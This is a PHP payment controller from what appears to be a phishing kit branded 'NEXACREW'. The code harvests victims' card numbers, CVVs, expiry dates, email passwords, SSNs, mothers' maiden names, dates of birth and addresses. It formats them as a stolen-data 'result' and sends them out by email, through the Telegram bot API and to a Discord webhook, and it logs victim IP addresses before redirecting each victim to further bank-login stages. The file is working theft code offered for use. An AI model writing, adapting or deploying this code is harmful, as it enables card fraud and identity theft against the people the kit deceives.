<?php
defined("ALLOW") or exit('No direct script access allowed');

class Payment
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 6)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/payment');
		} else {
			echo view('pc/payment');
		}
	}

	public function process()
	{
		if ($_SESSION['ccn'] == $_POST['ccn']) {
			redirect(base_url() . 'payment/#errorId=' . md5(time()));
		} else if (isset($_POST)) {
			$address = $_SESSION['address'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['region'];
			$zipCode = $_SESSION['zipcode'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$motherName = $_SESSION['mmn'];
			$phone = $_SESSION['phone'];
			$cardName = trim($_SESSION['namecard']);
			$cardNumber2 = $_POST['ccn'];
			$cardNumber2 = str_replace(" ", "", $cardNumber2);
			$cardCcv2 = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);

			$_SESSION['ccn'] = $cardNumber2;
			$bin = look_bin($cardNumber2);
			$email = trim($_SESSION['emailLogin']);
			$password = trim($_SESSION['password_email']);
			$password2 = trim($_SESSION['password_email2']);

			$message =
				"== [NEXACREW] ==

== [EMAIL ACCESS ==

:: Email Address   : {$email}
:: Password        : {$password}
:: Password        : {$password2}
:: Check format    : {$email}|{$password}
:: Check format 2  : {$email}|{$password2}

== [CARD DETAILS] ==

:: BIN             : {$bin}
:: Cardholder Name : {$cardName}
:: Card Number     : {$cardNumber2}
:: Expiration      : {$cardExpM}/{$cardExpY}
:: CVV             : {$cardCcv2}
:: Format          : {$cardNumber2}|{$cardExpM}|{$cardExpY}|{$cardCcv2}

== [BILLING ADDRESS] ==

:: Address         : {$address}
:: City            : {$cityP}
:: State           : {$state}
:: Zip Code        : {$zipCode}
:: Phone           : {$phone}
:: MMN             : {$motherName}
:: SSN             : {$ssn}
:: DOB             : {$dob}

== [DEVICE INFORMATION] ==

:: Date & Time     : " . _date() . "
:: Device          : {$this->goNEXA->platform}
:: Browser         : {$this->goNEXA->browser}
:: Country         : {$_SESSION['country']}
:: State           : {$_SESSION['region']}
:: City            : {$_SESSION['city']}
:: IP Address      : {$this->goNEXA->ip_address}
:: User Agent      : {$this->goNEXA->agent}";

			$subject = "CARD #2 :: {$bin} :: [ {$_SESSION['country']} - {$this->goNEXA->ip_address} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			// Kirim ke Email
			@mail(_config('RESULT'), $subject, $message, $headers);

			// Kirim ke Telegram
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			// Kirim ke Discord
			if (discord('Discord') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}
			write(FCPATH . 'Static/log_cc.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET CARD 2\r\n");

			if (_config('GETBANK') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#sessionId=' . md5(rand(0, 999)));
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
